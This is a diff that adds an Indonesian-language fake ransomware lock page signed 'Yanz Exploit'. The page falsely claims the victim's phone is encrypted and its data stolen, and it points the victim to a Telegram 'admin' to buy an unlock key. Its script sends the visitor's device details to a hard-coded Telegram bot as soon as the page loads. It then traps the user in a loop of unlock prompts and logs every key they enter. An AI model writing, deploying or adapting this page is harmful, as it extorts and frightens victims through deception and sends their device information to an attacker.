@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>⚠️ SYSTEM CRITICAL ERROR ⚠️</title>
+    <style>
+        body { 
+            background-color: #000; 
+            color: #ff0000; 
+            font-family: 'Courier New', Courier, monospace; 
+            text-align: center; 
+            margin: 0; 
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .warning-box { 
+            border: 5px double #ff0000; 
+            padding: 30px; 
+            background: rgba(255, 0, 0, 0.1);
+            box-shadow: 0 0 30px #ff0000;
+            max-width: 90%;
+        }
+        .blink { 
+            animation: blinker 0.6s linear infinite; 
+            font-weight: bold; 
+            font-size: 28px; 
+            margin-bottom: 20px;
+        }
+        @keyframes blinker { 50% { opacity: 0; } }
+        .desc { color: #fff; font-size: 16px; margin-bottom: 25px; }
+        .btn-group { display: flex; flex-direction: column; gap: 15px; }
+        .btn {
+            padding: 15px 25px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            border: none;
+            text-transform: uppercase;
+            border-radius: 5px;
+        }
+        .btn-unlock { background-color: #ff0000; color: #fff; }
+        .btn-admin { 
+            background-color: #0088cc; 
+            color: #fff; 
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .btn:hover { opacity: 0.8; }
+        #hid { color: yellow; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+    <div class="warning-box" id="lock-ui">
+        <div class="blink">SYSTEM ENCRYPTED</div>
+        <div class="desc">
+            Sistem lo udah dikunci permanen oleh <b>Yanz Exploit</b>.<br>
+            Seluruh data pemakaian telah dikirim ke server kami.<br>
+            Jangan coba-coba restart HP atau data ilang!
+        </div>
+        
+        <div class="btn-group">
+            <button class="btn btn-unlock" onclick="startUnlock()">MASUKKAN KEY</button>
+            <a href="https://t.me/durov_telegramreal" target="_blank" class="btn btn-admin">HUBUNGI ADMIN</a>
+        </div>
+        
+        <p style="margin-top: 20px; font-size: 11px; color: #888;">Hardware ID: <span id="hid"></span></p>
+    </div>
+
+    <script>
+        // --- KONFIGURASI BOT LO (ISI DI SINI!) ---
+        const BOT_TOKEN = '8510635650:AAH3ZxP-qkEO2hb8kjv-tZyOZieN0IatEwo'; 
+        const CHAT_ID = '8551809114'; 
+        const SECRET_KEY = 'yanz gege'; // Password buat buka
+        // ------------------------------------------
+
+        let isLocked = true;
+
+        // Generate ID palsu biar target makin panik
+        document.getElementById('hid').innerText = Math.random().toString(16).slice(2, 10).toUpperCase();
+
+        async function sendToTelegram(msg) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: `[LOG RANSOM] ${msg}`
+                    })
+                });
+            } catch (e) {}
+        }
+
+        // Ambil info detail pas target buka halaman
+        async function initialReport() {
+            const data = {
+                ua: navigator.userAgent,
+                platform: navigator.platform,
+                ram: navigator.deviceMemory || 'N/A',
+                cores: navigator.hardwareConcurrency || 'N/A'
+            };
+            const report = `🎯 MANGSA BARU!\n\nOS: ${data.platform}\nRAM: ${data.ram}GB\nCPU: ${data.cores} Cores\nBrowser: ${data.ua}`;
+            await sendToTelegram(report);
+        }
+
+        async function startUnlock() {
+            if (!isLocked) return;
+
+            // Ngirim log kalau dia mulai nyoba masukin key
+            sendToTelegram("Target lagi panik, nyoba masukin key...");
+
+            // LOOP PENJARA - Gak bakal lepas sampe kuncinya bener
+            while (isLocked) {
+                let keyInput = prompt("⚠️ DEVICE IS LOCKED ⚠️\n\nMasukkan UNLOCK KEY untuk memulihkan sistem:");
+
+                if (keyInput === null) {
+                    alert("GAK USAH KABUR! MASUKKAN KEY ATAU DATA ILANG!");
+                    continue;
+                }
+
+                if (keyInput === SECRET_KEY) {
+                    isLocked = false;
+                    sendToTelegram("✅ TARGET BERHASIL UNLOCK! Key bener: 'yanz gege'");
+                    document.body.innerHTML = "<h1 style='color:#00ff00'>SYSTEM RESTORED</h1><p style='color:#fff'>Enkripsi dicabut. Silakan gunakan HP kembali.</p>";
+                    break;
+                } else {
+                    sendToTelegram(`❌ Target masukin key salah: "${keyInput}"`);
+                    alert("KEY SALAH! Beli key ke admin.");
+                }
+            }
+        }
+
+        window.onload = initialReport;
+    </script>
+</body>
+</html>
